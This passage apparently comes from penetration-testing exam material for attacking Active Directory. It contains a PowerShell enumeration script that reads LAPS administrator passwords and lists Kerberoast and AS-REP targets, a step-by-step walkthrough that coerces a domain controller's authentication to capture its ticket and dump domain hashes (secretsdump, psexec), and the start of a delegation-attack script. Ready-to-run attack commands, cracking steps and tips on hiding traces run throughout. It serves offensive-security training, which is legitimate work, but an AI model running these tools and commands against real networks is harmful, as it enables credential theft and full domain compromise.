$script:DomainFqdn = ''

function Initialize-M12Root {
    if ($SearchRoot) {
        $script:RootPath = "LDAP://$SearchRoot"
    } elseif ($Domain) {
        # corp.local -> DC=corp,DC=local
        $parts = $Domain.Split('.') | Where-Object { $_ -ne '' }
        $dn = ($parts | ForEach-Object { "DC=$_" }) -join ','
        $script:RootPath = "LDAP://$dn"
        $script:DomainFqdn = $Domain
    } else {
        $rootDse = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
        $nc = $rootDse.Properties['defaultNamingContext']
        if (-not $nc -or $nc.Count -eq 0) {
            throw "Cannot get defaultNamingContext: this machine is not domain-joined or LDAP is unreachable. Pass -Domain DOMAIN explicitly"
        }
        $script:RootPath = "LDAP://$($nc[0])"
        $script:DomainFqdn = (($nc[0] -split ',') | Where-Object { $_ -like 'DC=*' } |
            ForEach-Object { $_.Substring(3) }) -join '.'
    }
    # Domain SID
    $domEntry = New-Object System.DirectoryServices.DirectoryEntry($script:RootPath)
    $sidBytes = $domEntry.Properties['objectSid'].Value
    if ($sidBytes) {
        $script:DomainSID = (New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)).Value
    }
    if (-not $script:DomainFqdn) {
        $script:DomainFqdn = (($script:RootPath -split ',') | Where-Object { $_ -like 'DC=*' } |
            ForEach-Object { $_.Substring(4) }) -join '.'
    }
}

function New-M12Searcher {
    param(
        [Parameter(Mandatory = $true)][string]$Filter,
        [string[]]$Properties = @('sAMAccountName'),
        [int]$PageSize = 200
    )
    $entry = New-Object System.DirectoryServices.DirectoryEntry($script:RootPath)
    $s = New-Object System.DirectoryServices.DirectorySearcher
    $s.SearchRoot = $entry
    $s.Filter = $Filter
    $s.PageSize = $PageSize
    $s.SearchScope = [System.DirectoryServices.SearchScope]::Subtree
    foreach ($p in $Properties) { [void]$s.PropertiesToLoad.Add($p) }
    return $s
}

# Fetch one attribute from a search result (returns $null when absent; takes the first value when multi-valued)
function Get-M12Prop {
    param($Result, [string]$Name)
    if ($Result.Properties.Contains($Name) -and $Result.Properties[$Name].Count -gt 0) {
        return $Result.Properties[$Name][0]
    }
    return $null
}

function Convert-M12FileTime {
    param($Raw)
    if (-not $Raw) { return '' }
    try {
        $ft = [Convert]::ToInt64($Raw)
        if ($ft -le 0) { return '' }
        return [DateTime]::FromFileTime($ft).ToString('yyyy-MM-dd HH:mm:ss')
    } catch { return [string]$Raw }
}

# userAccountControl key bits (these few are enough for the exam)
function Convert-M12Uac {
    param($Raw)
    if (-not $Raw) { return '' }
    $v = 0
    try { $v = [Convert]::ToInt32($Raw) } catch { return [string]$Raw }
    $flags = @()
    if ($v -band 0x000002)  { $flags += 'DISABLED' }
    if ($v -band 0x000020)  { $flags += 'PasswdNotReqd' }
    if ($v -band 0x002000)  { $flags += 'PASSWD_NOT_EXPIRED' }
    if ($v -band 0x020000)  { $flags += 'DONT_REQ_PREAUTH(ASREP)' }
    if ($v -band 0x040000)  { $flags += 'TrustedForDelegation (unconstrained)' }
    if ($v -band 0x080000)  { $flags += 'NOT_DELEGATED (sensitive, cannot be delegated)' }
    if ($v -band 0x100000)  { $flags += 'USE_DES_ONLY' }
    if ($v -band 0x200000)  { $flags += 'TrustedToAuthForDelegation (protocol transition)' }
    return ($flags -join ',')
}

function Write-M12Head {
    param([string]$Text)
    Write-Output ""
    Write-Output "===== $Text ====="
}

function Limit-M12Rows {
    param($Rows)
    if ($MaxResults -gt 0) { return @($Rows | Select-Object -First $MaxResults) }
    return @($Rows)
}

# ---------------------------------------------------------------------------
# Domain: domain information + MAQ (scenario 51 needs MachineAccountQuota > 0 confirmed)
# ---------------------------------------------------------------------------
function Get-M12DomainInfo {
    Write-M12Head "Domain information (Domain)"
    Write-Output "Search root   : $script:RootPath"
    Write-Output "Domain FQDN   : $script:DomainFqdn"
    Write-Output "Domain SID    : $script:DomainSID"
    $me = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    Write-Output "Current identity: $($me.Name)  (authentication type $($me.AuthenticationType))"

    $s = New-M12Searcher -Filter '(objectClass=domainDNS)' `
        -Properties @('distinguishedName','ms-DS-MachineAccountQuota','msDS-Behavior-Version')
    $r = $s.FindOne()
    if ($r) {
        $maq = Get-M12Prop $r 'ms-DS-MachineAccountQuota'
        if ($maq) {
            Write-Output "MachineAccountQuota : $maq   (scenario 51 RBCD needs > 0; default 10)"
        } else {
            Write-Output "MachineAccountQuota : not read (old domain or insufficient rights; assume 10 and re-check if RBCD machine creation fails)"
        }
        $func = Get-M12Prop $r 'msDS-Behavior-Version'
        if ($func) { Write-Output "Domain functional level msDS-Behavior-Version : $func" }
    }

    # DC list
    Write-Output ""
    Write-Output "--- Domain controllers (falls back to an approximation from the Computers container when the configuration partition is unreliable) ---"
    $s2 = New-M12Searcher -Filter '(&(objectCategory=computer)(primaryGroupID=516))' `
        -Properties @('dnsHostName','operatingSystem')
    foreach ($c in $s2.FindAll()) {
        Write-Output ("DC  : " + (Get-M12Prop $c 'dnsHostName'))
    }
}

# ---------------------------------------------------------------------------
# Users
# ---------------------------------------------------------------------------
function Get-M12Users {
    Write-M12Head "Domain users (Users) - watch for cleartext passwords in description / adminCount=1 / no pre-auth"
    $s = New-M12Searcher -Filter '(&(objectCategory=person)(objectClass=user))' `
        -Properties @('sAMAccountName','userPrincipalName','description','adminCount','pwdLastSet','lastLogon','userAccountControl','servicePrincipalName')
    $rows = @()
    foreach ($r in $s.FindAll()) {
        $rows += New-Object PSObject -Property @{
            SamAccountName = (Get-M12Prop $r 'sAMAccountName')
            UPN            = (Get-M12Prop $r 'userPrincipalName')
            AdminCount     = (Get-M12Prop $r 'adminCount')
            UAC            = (Convert-M12Uac (Get-M12Prop $r 'userAccountControl'))
            LastLogon      = (Convert-M12FileTime (Get-M12Prop $r 'lastLogon'))
            Description    = (Get-M12Prop $r 'description')
        }
    }
    Limit-M12Rows $rows | Sort-Object SamAccountName |
        Format-Table -AutoSize SamAccountName, UPN, AdminCount, UAC, LastLogon, Description |
        Out-String -Width 220 | Write-Output
    Write-Output "AS-REP Roasting candidates (UAC contains DONT_REQ_PREAUTH):"
    $s3 = New-M12Searcher -Filter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' `
        -Properties @('sAMAccountName')
    foreach ($r in $s3.FindAll()) { Write-Output ("  " + (Get-M12Prop $r 'sAMAccountName')) }
}

# ---------------------------------------------------------------------------
# Groups: all groups + privileged group members (located by well-known RID, so the language of the group name does not matter)
# ---------------------------------------------------------------------------
function Get-M12Groups {
    Write-M12Head "Privileged group members (Groups) - located by SID RID, unaffected by localized group names"
    if (-not $script:DomainSID) {
        Write-Output "[!] Cannot get the domain SID, skipping privileged group resolution (try passing -Domain DOMAIN explicitly)"
        return
    }
    $rids = @{
        '512' = 'Domain Admins'
        '519' = 'Enterprise Admins'
        '518' = 'Schema Admins'
        '544' = 'Builtin Administrators'
    }
    foreach ($rid in ($rids.Keys | Sort-Object)) {
        $sid = "$script:DomainSID-$rid"
        $s = New-M12Searcher -Filter "(objectSid=$sid)" -Properties @('sAMAccountName','member','description')
        $r = $s.FindOne()
        if (-not $r) { continue }
        Write-Output ("--- {0} ({1}) ---" -f $rids[$rid], (Get-M12Prop $r 'sAMAccountName'))
        $members = $r.Properties['member']
        if ($members) { foreach ($m in $members) { Write-Output ("  " + $m) } }
        else { Write-Output "  (no members)" }
    }

    Write-M12Head "All groups (name + member count)"
    $s2 = New-M12Searcher -Filter '(objectClass=group)' -Properties @('sAMAccountName','member','adminCount')
    $rows = @()
    foreach ($r in $s2.FindAll()) {
        $rows += New-Object PSObject -Property @{
            Group      = (Get-M12Prop $r 'sAMAccountName')
            AdminCount = (Get-M12Prop $r 'adminCount')
            Members    = ($r.Properties['member']).Count
        }
    }
    Limit-M12Rows $rows | Sort-Object Group | Format-Table -AutoSize Group, AdminCount, Members |
        Out-String -Width 160 | Write-Output
}

# ---------------------------------------------------------------------------
# Computers
# ---------------------------------------------------------------------------
function Get-M12Computers {
    Write-M12Head "Domain computers (Computers) - watch the OS (old systems = local privilege escalation surface) and last logon"
    $s = New-M12Searcher -Filter '(objectClass=computer)' `
        -Properties @('sAMAccountName','dnsHostName','operatingSystem','operatingSystemVersion','lastLogon','distinguishedName')
    $rows = @()
    foreach ($r in $s.FindAll()) {
        $rows += New-Object PSObject -Property @{
            Name      = (Get-M12Prop $r 'sAMAccountName')
            DnsHost   = (Get-M12Prop $r 'dnsHostName')
            OS        = (Get-M12Prop $r 'operatingSystem')
            OSVer     = (Get-M12Prop $r 'operatingSystemVersion')
            LastLogon = (Convert-M12FileTime (Get-M12Prop $r 'lastLogon'))
        }
    }
    Limit-M12Rows $rows | Sort-Object Name | Format-Table -AutoSize Name, DnsHost, OS, OSVer, LastLogon |
        Out-String -Width 200 | Write-Output
}

# ---------------------------------------------------------------------------
# SPN: Kerberoast candidates
# ---------------------------------------------------------------------------
function Get-M12Spn {
    Write-M12Head "SPN accounts (Kerberoast candidates; scenario 52's service account is here too)"
    $s = New-M12Searcher -Filter '(&(servicePrincipalName=*)(!(objectClass=computer)))' `
        -Properties @('sAMAccountName','servicePrincipalName','adminCount','pwdLastSet','userAccountControl','memberOf')
    foreach ($r in $s.FindAll()) {
        $spns = @($r.Properties['servicePrincipalName']) -join ' | '
        Write-Output ("Account : " + (Get-M12Prop $r 'sAMAccountName'))
        Write-Output ("  SPN    : " + $spns)
        $uac = Convert-M12Uac (Get-M12Prop $r 'userAccountControl')
        if ($uac) { Write-Output ("  UAC    : " + $uac) }
        $mo = $r.Properties['memberOf']
        if ($mo) { Write-Output ("  group members : " + (@($mo) -join ' | ')) }
    }
    Write-Output ""
    Write-Output "Next (attack machine): impacket-GetUserSPNs -dc-ip TARGET DOMAIN/USER:PASS -outputfile spn.txt"
    Write-Output "               hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt"
}

# ---------------------------------------------------------------------------
# Delegation: unconstrained / constrained / RBCD
# ---------------------------------------------------------------------------
function Get-M12Delegation {
    Write-M12Head "Unconstrained delegation (UAC 0x80000=524288) - scenario 50's landing spot"
    $s = New-M12Searcher -Filter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' `
        -Properties @('sAMAccountName','dnsHostName','distinguishedName')
    $found = $false
    foreach ($r in $s.FindAll()) {
        $found = $true
        Write-Output ("  " + (Get-M12Prop $r 'sAMAccountName') + "  " + (Get-M12Prop $r 'dnsHostName'))
    }
    if (-not $found) { Write-Output "  (none)" }

    Write-M12Head "Constrained delegation (msDS-AllowedToDelegateTo) - scenario 52's service accounts"
    $s2 = New-M12Searcher -Filter '(msDS-AllowedToDelegateTo=*)' `
        -Properties @('sAMAccountName','msDS-AllowedToDelegateTo','userAccountControl')
    $found = $false
    foreach ($r in $s2.FindAll()) {
        $found = $true
        $uac = Convert-M12Uac (Get-M12Prop $r 'userAccountControl')
        Write-Output ("  Account : " + (Get-M12Prop $r 'sAMAccountName') + ("  [{0}]" -f $uac))
        foreach ($t in $r.Properties['msDS-AllowedToDelegateTo']) { Write-Output ("      can delegate to : " + $t) }
    }
    if (-not $found) { Write-Output "  (none)" }

    Write-M12Head "RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity already populated) - scenario 51's target machines"
    $s3 = New-M12Searcher -Filter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' `
        -Properties @('sAMAccountName','dnsHostName','distinguishedName')
    $found = $false
    foreach ($r in $s3.FindAll()) {
        $found = $true
        Write-Output ("  " + (Get-M12Prop $r 'sAMAccountName') + "  " + (Get-M12Prop $r 'dnsHostName'))
        Write-Output ("      DN : " + (Get-M12Prop $r 'distinguishedName'))
    }
    if (-not $found) { Write-Output "  (none - nobody has touched this attribute, which is exactly the state we can write to)" }
    Write-Output ""
    Write-Output "Next: configure RBCD with m12-delegation-attacks.ps1 -Mode RBCD"
}

# ---------------------------------------------------------------------------
# ACL: read-only summary + high-risk permission highlighting
# ---------------------------------------------------------------------------
function Get-M12AclSummary {
    $target = $AclTarget
    if (-not $target) { $target = $script:RootPath -replace '^LDAP://', '' }
    Write-M12Head "ACL summary (read-only): $target"
    $interesting = @('GenericAll','GenericWrite','WriteDacl','WriteOwner','ExtendedRight','CreateChild','Delete','WriteProperty','Self')
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$target")
    try {
        $rules = $de.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
    } catch {
        Write-Output "[!] Failed to read the ACL: $($_.Exception.Message) (no READ_CONTROL on the target object, or a wrong DN)"
        Write-Output "    Confirm the DN using the distinguishedName printed by -Mode Computers, do not write a container name."
        return
    }
    $rows = @()
    foreach ($rule in $rules) {
        $rights = [string]$rule.ActiveDirectoryRights
        $hit = ''
        foreach ($i in $interesting) {
            if (($rule.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]$i) -ne 0) {
                $hit = 'YES'
                break
            }
        }
        if (-not $hit) { continue }
        $who = $rule.IdentityReference.Value
        try { $who = $rule.IdentityReference.Translate([System.Security.Principal.NTAccount]).Value } catch { }
        $rows += New-Object PSObject -Property @{
            Principal = $who
            Rights    = $rights
            Type      = [string]$rule.AccessControlType
            ObjectType= [string]$rule.ObjectType
            Inherited = $rule.IsInherited
        }
    }
    if ($rows.Count -eq 0) {
        Write-Output "No GenericAll/GenericWrite/WriteDacl/WriteOwner or similar high-risk entries found (or the current identity cannot read the ACL)."
    } else {
        $rows | Sort-Object Principal | Format-Table -AutoSize Principal, Rights, Type, ObjectType, Inherited |
            Out-String -Width 220 | Write-Output
    }
    Write-Output "Note: ObjectType is the GUID of an attribute/extended right; to judge LAPS read access, check whether it equals"
    Write-Output "      the schema GUID of ms-Mcs-AdmPwd (the measured result from -Mode LAPS is quicker)."
}

# ---------------------------------------------------------------------------
# LAPS: legacy (ms-Mcs-AdmPwd*) + Windows LAPS (msLAPS-*) + readability verdict
# ---------------------------------------------------------------------------
function Get-M12Laps {
    Write-M12Head "LAPS enumeration (scenario 49)"

    $name = $ComputerName
    if ($name -and -not $name.EndsWith('$')) { $name = "$name`$" }
    if ($name) {
        $filter = "(&(objectClass=computer)(sAMAccountName=$name))"
    } else {
        # First probe which machines have LAPS installed: the expiration-time attribute is readable by Domain Users by default, so it is an existence test
        $filter = '(|(ms-Mcs-AdmPwdExpirationTime=*)(msLAPS-PasswordExpirationTime=*)(ms-Mcs-AdmPwd=*)(msLAPS-Password=*))'
    }
    $props = @('sAMAccountName','dnsHostName','distinguishedName',
               'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime',
               'msLAPS-Password','msLAPS-PasswordExpirationTime','msLAPS-EncryptedPassword')
    $s = New-M12Searcher -Filter $filter -Properties $props

    $legacyHits = 0
    $winlapsHits = 0
    $encHits = 0
    $lastDns = 'TARGET'
    foreach ($r in $s.FindAll()) {
        $host1 = Get-M12Prop $r 'sAMAccountName'
        $dns   = Get-M12Prop $r 'dnsHostName'
        if ($dns) { $lastDns = $dns }
        $pwd   = Get-M12Prop $r 'ms-Mcs-AdmPwd'
        $exp   = Convert-M12FileTime (Get-M12Prop $r 'ms-Mcs-AdmPwdExpirationTime')
        $wpwd  = Get-M12Prop $r 'msLAPS-Password'
        $wexp  = Get-M12Prop $r 'msLAPS-PasswordExpirationTime'
        $wenc  = Get-M12Prop $r 'msLAPS-EncryptedPassword'

        Write-Output ("Machine : {0}  ({1})" -f $host1, $dns)
        if ($pwd) {
            $legacyHits++
            Write-Output ("  [legacy LAPS] ms-Mcs-AdmPwd = {0}   (expires {1})" -f $pwd, $exp)
            Write-Output ("  Run: impacket-wmiexec DOMAIN/Administrator@{0} -p '{1}'" -f $dns, $pwd)
        }
        if ($wpwd) {
            $winlapsHits++
            Write-Output ("  [Windows LAPS cleartext mode] msLAPS-Password = {0}" -f $wpwd)
        }
        if ($wenc) {
            $encHits++
            Write-Output ("  [Windows LAPS encrypted mode] msLAPS-EncryptedPassword present ({0} bytes); plain LDAP cannot decrypt the cleartext" -f @($wenc).Count)
        }
        if (-not $pwd -and -not $wpwd -and -not $wenc) {
            Write-Output ("  Only the expiration time ({0}) is present with no password value -> LAPS is deployed but **the current identity has no read access**" -f $exp)
        }
    }

    Write-Output ""
    Write-Output "--- Readability verdict ---"
    if (($legacyHits + $winlapsHits) -gt 0) {
        Write-Output "The current identity **can** read the cleartext password -> scenario 49 holds; land it with the wmiexec command above."
        Write-Output "If only WinRM is open, use: evil-winrm -i $lastDns -u Administrator -p '<password you read>'"
    } elseif ($encHits -gt 0) {
        Write-Output "Only msLAPS-EncryptedPassword (DPAPI-encrypted) is visible: plain LDAP cannot get the cleartext."
        Write-Output "Alternatives: 1) find a machine still on legacy LAPS; 2) find a machine with msLAPS-Password cleartext mode enabled;"
        Write-Output "      3) read it from an already-controlled domain admin / local admin session with the Windows LAPS module:"
        Write-Output "         Get-LapsADPassword -Identity TARGET -AsPlainText   (Windows LAPS, RSAT/PowerShell 7 environment)"
        Write-Output "         legacy LAPS client PowerShell module installed by msiexec: Import-Module AdmPwd.PS"
        Write-Output "         Get-AdmPwdPassword -ComputerName TARGET"
    } else {
        Write-Output "No password attribute read at all: 1) LAPS is not deployed in the domain; 2) the current user has no read access to ms-Mcs-AdmPwd."
        Write-Output "Another angle: find the principals in this domain that have ReadProperty on the LAPS attributes (PowerView form in"
        Write-Output "m12-laps-and-trust-notes.md), or use the RBCD/delegation/certificate entry point to reach a higher identity first."
    }

    Write-Output ""
    Write-Output "--- Is a LAPS client installed locally (version check) ---"
    foreach ($p in @('C:\Program Files\LAPS\CSE\Admpwd.dll', 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll')) {
        if (Test-Path $p) { Write-Output ("  legacy LAPS CSE present: " + $p) }
    }
    Write-Output "  Windows LAPS: built into Windows 11/2022+, check the registry HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\LAPS"
    Write-Output "              or judge by whether Get-LapsADPassword is available."
}

# ---------------------------------------------------------------------------
# Help
# ---------------------------------------------------------------------------
function Show-M12Help {
    Write-Output @"

m12-ad-enum-windows.ps1 - pure ADSI domain enumeration (no RSAT / no PowerView)

  .\m12-ad-enum-windows.ps1 -Mode All
      run everything: Domain / Users / Groups / Computers / SPN / Delegation / ACL / LAPS
  .\m12-ad-enum-windows.ps1 -Mode Domain     [-Domain corp.local]
      domain SID / MAQ (a prerequisite for adding a machine for RBCD) / current identity / DC list
  .\m12-ad-enum-windows.ps1 -Mode Users      [-MaxResults 50]
      users + AS-REP Roasting candidates
  .\m12-ad-enum-windows.ps1 -Mode Groups
      privileged group members (DA/EA/Schema/Builtin Admins) + full group listing
  .\m12-ad-enum-windows.ps1 -Mode Computers
      computers + OS + last logon
  .\m12-ad-enum-windows.ps1 -Mode SPN
      Kerberoast candidates + service accounts (scenario 52)
  .\m12-ad-enum-windows.ps1 -Mode Delegation
      unconstrained / constrained / RBCD, all three (scenarios 50/51/52)
  .\m12-ad-enum-windows.ps1 -Mode ACL [-AclTarget "CN=WS02,CN=Computers,DC=corp,DC=local"]
      read-only ACL summary, highlighting GenericAll/GenericWrite/WriteDacl/WriteOwner
  .\m12-ad-enum-windows.ps1 -Mode LAPS [-ComputerName WS02]
      both LAPS versions + readability verdict (scenario 49)

Placeholders: DOMAIN=corp.local  TARGET=WS02  USER/PASS appear only in the follow-up commands that get printed.
This script only reads and never modifies a directory object; for writing delegation attributes see m12-delegation-attacks.ps1.
"@
}

# ---------------------------------------------------------------------------
# Main flow
# ---------------------------------------------------------------------------
if ($Help) { Show-M12Help; return }

try {
    Initialize-M12Root
} catch {
    Write-Output "[!] Initialization failed: $($_.Exception.Message)"
    Write-Output "    Fix: pass -Domain DOMAIN explicitly (e.g. -Domain corp.local), or confirm the machine is in the domain and the DC is reachable."
    exit 1
}

switch ($Mode) {
    'All'       { Get-M12DomainInfo; Get-M12Users; Get-M12Groups; Get-M12Computers
                  Get-M12Spn; Get-M12Delegation; Get-M12AclSummary; Get-M12Laps }
    'Domain'    { Get-M12DomainInfo }
    'Users'     { Get-M12Users }
    'Groups'    { Get-M12Groups }
    'Computers' { Get-M12Computers }
    'SPN'       { Get-M12Spn }
    'Delegation'{ Get-M12Delegation }
    'ACL'       { Get-M12AclSummary }
    'LAPS'      { Get-M12Laps }
    'Help'      { Show-M12Help }
}

Write-Output ""
Write-Output "[*] Done -Mode $Mode. Delegation/RBCD landing: m12-delegation-attacks.ps1;"
Write-Output "[*] Same enumeration on Linux: m12-ad-enum-linux.sh; trust and Extra SID: m12-laps-and-trust-notes.md"
````

## Scenario 50: You control an unconstrained delegation machine but have no domain-level identity yet

**Situation**: You control a machine configured for **unconstrained delegation (Trusted for Delegation)** and can run Rubeus / trigger authentication on it; you still have no domain admin identity. The next move depends on whether you can make a high-value identity (a DC machine account or a domain admin) authenticate to that machine and capture its TGT.

**Assumptions**: The target DC's / domain admin's SPN ports (445/5985, or 88 for a callback) can reach the unconstrained host; you run the capture tool as SYSTEM on the unconstrained host. Once you hold the DC machine account's TGT you can DCSync (a DC holds replication rights); a domain admin's TGT means direct impersonation.

**Prepare (attacker side)**: On the unconstrained host, stage `Rubeus.exe` plus an authentication trigger (`SpoolSample.exe` / `printerbug` / `PetitPotam`); on the attack machine, stage `impacket-ticketConverter` and `secretsdump`. Trigger methods for induced authentication are in `m12-delegation-attacks.ps1 -Mode Unconstrained`.

**Procedure**:
```powershell
# 1) On the unconstrained host (SYSTEM), start capturing tickets in the background
Rubeus.exe monitor /interval:5 /nowrap
# 2) In another window, coerce the DC into authenticating to this host (which is the unconstrained host we control)
SpoolSample.exe DC01 $env:COMPUTERNAME        # or printerbug DC01 $env:COMPUTERNAME
# 3) When a base64 TGT for DC01$ shows up in the monitor output -> save it as dc.txt
```
```bash
# 4) Convert and use it on the attack machine
impacket-ticketConverter dc.txt dc.ccache
export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass DC01.corp.local        # DC machine account -> DCSync krbtgt/domain admin hashes
impacket-psexec -k -no-pass CORP/Administrator@DC01.corp.local -hashes :NTHASH  # once you have the hash
```
**Scripts used**: `m12-delegation-attacks.ps1` (Rubeus monitor + trigger + base64 export template; the Linux-side conversion commands are in the comments too).

**Validation**: `secretsdump` dumping `krbtgt`/administrator hashes proves you captured the DC machine TGT; check with `klist` first that the principal is `DC01$`.

**Failure branches and alternatives**:
- SpoolSample returns nothing / errors (patched, or RPC blocked) -> switch vector: `PetitPotam` (EFSRPC), `DFSCoerce`, the MS-RPRN variant `dementor`; still nothing -> go passive: leave Rubeus monitor running and wait for a real domain admin to log on to this machine or touch one of its services.
- You captured a normal user's TGT (not a DC/domain admin) -> use it to move laterally first (the machines that user can reach), or keep waiting for a higher-value authentication; you can also widen coverage with the `Rubeus harvest` idea.
- The unconstrained host and the DC are not in mutually reachable segments -> if you cannot induce authentication, the host's only remaining value is passive collection; go back to enumeration for another entry point (do not burn time on a callback that cannot happen).

**Exam / OPSEC notes**: Running `Rubeus monitor` on an unconstrained host captures every authentication continuously and is loud in the logs - stop it as soon as the job is done (the DC ticket is in hand); export captured tickets to the attack machine immediately and then clean up the local base64 text. Do not take a domain admin TGT and start `psexec`-ing everywhere; run `secretsdump` first to confirm the value, then choose the smallest action that works.

---

#### `m12-delegation-attacks.ps1` {#m12-delegation-attacks-ps1}

````powershell
<#
Purpose: the Windows-side landing script for the delegation trio -
      RBCD: query / configure (write the fake machine account SID into the target machine's
            msDS-AllowedToActOnBehalfOfOtherIdentity) / roll back, in pure ADSI + .NET;
      constrained delegation: enumerate a service account's msDS-AllowedToDelegateTo and give S4U2Self+S4U2Proxy
            command templates for both sub-cases (with/without protocol transition) in Rubeus s4u and impacket-getST form;
      unconstrained delegation: the four pre-flight checks plus Rubeus monitor / induced-authentication command templates.
Scenario: M12 scenario 50 (unconstrained, capture the DC TGT), 51 (RBCD, impersonate an administrator), 52 (constrained delegation to a given SPN).
Dependencies: ADSI / System.DirectoryServices / System.Security.AccessControl (built into the OS,
      no RSAT ActiveDirectory module required);
      Rubeus.exe (s4u / monitor / ptt; deliver it to the host yourself and point -ToolDir at its directory);
      SpoolSample.exe or printerbug (the induced-authentication trigger for unconstrained scenarios, optional);
      commands are printed by default; -Execute is what actually calls the external exe (to avoid accidental triggering).
Usage: # 51 RBCD: write the attribute and print the attack-machine follow-up commands
      .\m12-delegation-attacks.ps1 -Mode RBCD -TargetComputer WS02 -FakeAccount 'FAKE01$'
      # 51 RBCD: must be rolled back after the job is done
      .\m12-delegation-attacks.ps1 -Mode RBCD-Rollback -TargetComputer WS02
      # 52 constrained delegation: see where svc_sql can delegate to, and print the commands for both cases
      .\m12-delegation-attacks.ps1 -Mode Constrained -ServiceAccount svc_sql -Spn 'cifs/WS02.corp.local'
      # 50 unconstrained: pre-flight check + ticket capture/trigger commands
      .\m12-delegation-attacks.ps1 -Mode Unconstrained -ToolDir C:\Tools -Execute
      # enumerate the current state of all three delegation types only
      .\m12-delegation-attacks.ps1 -Mode Enum
Placeholders: DOMAIN=domain FQDN (corp.local) TARGET=target host (WS02)
      USER/PASS=known credentials (Rubeus s4u needs the service account's cleartext password or rc4/aes key)
      - no real domain names or passwords are written into the script; everything comes in as an argument or is printed as a placeholder for you to replace.
Test status: not exercised in a Windows domain; bracket/quote pairing was checked locally. The RBCD write uses the publicly
      known RawSecurityDescriptor binary form (equivalent to PowerView Set-DomainObject),
      and requires the current identity to hold GenericWrite/GenericAll on the target computer object, or write access to that attribute.
Differences from docs/12-ad-attacks.md:
  1) The doc only gives the impacket side of scenario 51 and leaves 'write AllowedToAct' to this script - this script's
     RBCD mode **only writes the attribute** and does not create a machine account (create the machine on the attack machine with impacket-addcomputer;
     -FakeAccount names an account you already created; using a controlled service account as the fake principal works the same way).
  2) The doc says 'write the security descriptor with .NET ADSI, without depending on the ActiveDirectory module' - the implementation matches,
     but note that if the attribute already has a value it is Cleared before writing, so no stale ACE is left behind.
  3) The constrained-delegation ticket request itself (S4U2Self/S4U2Proxy) cannot be done in pure .NET, so the script uses
     WindowsIdentity for the identity and delegation-prerequisite self-check, and hands over the actual ticket request as copy-pasteable
     Rubeus / impacket command sets (the doc likewise only gives templates).
#>
[CmdletBinding()]
param(
    [ValidateSet('Enum','RBCD','RBCD-Rollback','Constrained','Unconstrained','Help')]
    [string]$Mode = 'Enum',
    [string]$TargetComputer = '',      # TARGET: the RBCD target machine / this host for unconstrained scenarios
    [string]$FakeAccount = '',         # fake machine account sAMAccountName, e.g. FAKE01$
    [string]$ServiceAccount = '',      # constrained-delegation service account, e.g. svc_sql
    [string]$ImpersonateUser = 'Administrator',  # the user to impersonate
    [string]$Spn = '',                 # target service SPN, e.g. cifs/WS02.corp.local
    [string]$Domain = '',              # DOMAIN: domain FQDN, blank = current domain
    [string]$ToolDir = '.',            # directory holding Rubeus.exe / SpoolSample.exe
    [switch]$Execute,                  # actually invoke Rubeus / the trigger (default is print only)
    [switch]$Help
)

$ErrorActionPreference = 'Continue'

# Attach the common parameters to the script scope so every function can read them (functions do not rely on the caller's local scope)
$script:ToolDir = $ToolDir
$script:ImpersonateUser = $ImpersonateUser

# ---------------------------------------------------------------------------
# Shared: search root / SID / computer objects
# ---------------------------------------------------------------------------
function Initialize-M12dRoot {
    if ($Domain) {
        $parts = $Domain.Split('.') | Where-Object { $_ -ne '' }
        $dn = ($parts | ForEach-Object { "DC=$_" }) -join ','
        return "LDAP://$dn"
    }
    $rootDse = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
    $nc = $rootDse.Properties['defaultNamingContext']
    if (-not $nc -or $nc.Count -eq 0) {
        throw "Cannot get defaultNamingContext: not domain-joined or LDAP unreachable; pass -Domain DOMAIN explicitly"
    }
    return "LDAP://$($nc[0])"
}

function Get-M12dSid {
    param([Parameter(Mandatory = $true)][string]$SamAccountName)
    $s = New-Object System.DirectoryServices.DirectorySearcher
    $s.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($script:Root)
    $s.Filter = "(sAMAccountName=$SamAccountName)"
    $s.PageSize = 10
    [void]$s.PropertiesToLoad.Add('objectSid')
    [void]$s.PropertiesToLoad.Add('distinguishedName')
    $r = $s.FindOne()
    if (-not $r) { throw "Account $SamAccountName not found in the domain (machine accounts need the trailing $)" }
    $sid = New-Object System.Security.Principal.SecurityIdentifier($r.Properties['objectSid'][0], 0)
    return @($sid.Value, [string]$r.Properties['distinguishedName'][0])
}

function Get-M12dComputerDn {
    param([Parameter(Mandatory = $true)][string]$ComputerName)
    $name = $ComputerName
    if (-not $name.EndsWith('$')) { $name = "$name`$" }
    $info = Get-M12dSid $name
    return $info[1]
}

function Write-M12dHead { param([string]$T) Write-Output ""; Write-Output "===== $T =====" }

# Current identity self-check (WindowsIdentity / impersonation level, decides whether ticket capture is possible later)
function Show-M12dIdentity {
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    Write-Output ("  Current identity : " + $id.Name)
    Write-Output ("  SID             : " + $id.User.Value)
    Write-Output ("  Auth type        : " + $id.AuthenticationType)
    Write-Output ("  Impersonation    : " + $id.ImpersonationLevel)
    if ($id.User.Value -eq 'S-1-5-18') {
        Write-Output "  -> SYSTEM: you can run Rubeus monitor (it needs to read TGTs out of LSASS)"
    } else {
        Write-Output "  -> Not SYSTEM. Rubeus monitor normally needs SYSTEM; a local admin with high integrity"
        Write-Output "     can often run it too, but the tickets you capture depend on the identities in the local sessions."
    }
    $p = New-Object System.Security.Principal.WindowsPrincipal($id)
    if ($p.IsInRole('S-1-5-32-544')) { Write-Output "  -> member of the local Administrators group (for elevation to SYSTEM see module M06)" }
}

# ---------------------------------------------------------------------------
# RBCD: read / write / roll back
# ---------------------------------------------------------------------------
function Get-M12dRbcd {
